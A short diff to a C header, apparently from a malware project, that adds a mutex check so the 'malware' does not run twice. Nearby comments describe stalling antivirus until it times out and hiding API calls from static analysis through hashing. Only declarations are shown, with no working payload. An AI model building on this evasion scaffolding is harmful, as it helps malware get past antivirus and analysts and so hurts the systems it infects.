@@ -16,6 +16,14 @@ bool check_resources();
 // execute complex calculations to make the AV timeout.
 void smart_delay();
 
+// --- ANTI-CRASH
+
+typedef HANDLE (WINAPI *pCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
+typedef DWORD (WINAPI *pGetLastError)(void);
+
+// check if malware is already running
+bool check_mutex();
+
 // --- ANTI-STATIC ANALYSIS (Dynamic API resolution with hashing)
 
 // hashing function
